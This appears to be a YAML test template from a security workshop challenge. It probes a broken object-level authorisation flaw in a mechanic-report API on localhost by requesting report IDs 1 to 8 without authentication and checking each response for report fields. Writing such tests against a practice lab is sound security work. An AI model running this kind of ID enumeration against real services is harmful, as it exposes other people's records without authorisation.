@@ -1,0 +1,89 @@
+name: BOLA template for challenge 2 
+
+description: |- 
+              Endpoint /workshop/api/mechanic/mechanic_report?report_id=6 was leaked when we send a mechanic report.
+              We realised no authentication was required to access report.
+              The following will test the endpoint for the resultant BOLA vulnerability found by:
+                 checking for status_code as it was observed that status_code 200 is the code for successful query. 
+                 text pattern "created_on" and "problem_details" as these strings are found when request is successful 
+
+requests:
+  - url: http://localhost:8888/workshop/api/mechanic/mechanic_report
+    method: GET
+    params:
+      report_id: 1
+    response_checks:
+      - status_code: 200
+      - text:
+          - pattern: created_on
+          - pattern: problem_details
+
+  - url: http://localhost:8888/workshop/api/mechanic/mechanic_report
+    method: GET
+    params:
+      report_id: 2
+    response_checks:
+      - status_code: 200
+      - text:
+          - pattern: created_on
+          - pattern: problem_details
+
+  - url: http://localhost:8888/workshop/api/mechanic/mechanic_report
+    method: GET
+    params:
+      report_id: 3
+    response_checks:
+      - status_code: 200
+      - text:
+          - pattern: created_on
+          - pattern: problem_details
+
+  - url: http://localhost:8888/workshop/api/mechanic/mechanic_report
+    method: GET
+    params:
+      report_id: 4
+    response_checks:
+      - status_code: 200
+      - text:
+          - pattern: created_on
+          - pattern: problem_details
+
+  - url: http://localhost:8888/workshop/api/mechanic/mechanic_report
+    method: GET
+    params:
+      report_id: 5
+    response_checks:
+      - status_code: 200
+      - text:
+          - pattern: created_on
+          - pattern: problem_details
+
+  - url: http://localhost:8888/workshop/api/mechanic/mechanic_report
+    method: GET
+    params:
+      report_id: 6
+    response_checks:
+      - status_code: 200
+      - text:
+          - pattern: created_on
+          - pattern: problem_details
+
+  - url: http://localhost:8888/workshop/api/mechanic/mechanic_report
+    method: GET
+    params:
+      report_id: 7
+    response_checks:
+      - status_code: 200
+      - text:
+          - pattern: created_on
+          - pattern: problem_details
+
+  - url: http://localhost:8888/workshop/api/mechanic/mechanic_report
+    method: GET
+    params:
+      report_id: 8
+    response_checks:
+      - status_code: 200
+      - text:
+          - pattern: created_on
+          - pattern: problem_details
